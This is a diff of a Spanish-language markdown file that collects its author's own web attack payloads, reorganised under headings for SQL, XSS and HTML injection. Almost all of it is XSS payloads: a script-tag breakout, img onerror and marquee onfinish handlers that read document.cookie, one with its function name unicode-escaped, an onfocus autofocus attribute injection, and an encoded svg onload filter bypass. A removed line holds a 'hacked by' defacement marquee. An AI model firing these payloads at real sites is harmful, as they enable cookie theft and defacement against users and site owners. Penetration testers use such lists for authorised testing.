@@ -1,9 +1,9 @@
 ## Recopilación de todos los Payloads usados/creados por mi.
 
 
--1'<marquee>hacked by Y000</marquee>
+# Para detectar errores: sql inyection, xss inyection y HTML inyection
 
-
+`'"><script>alert`1`</script><h1>d</h1>`
 
 
 
@@ -19,10 +19,12 @@
 
 
 
-Img + Onerror
+### Img + Onerror
 
 `<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">`
 
+
+### marcas
 
 
 ```
@@ -37,10 +39,16 @@ Img + Onerror
 ```
 
 
-<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+### Marquee + alert
+
+`<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>`
 
 
 
+### onload / onfocus
+
+```
 "onfocus="alert('Y000')"+autofocus="
 
 </script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
+```
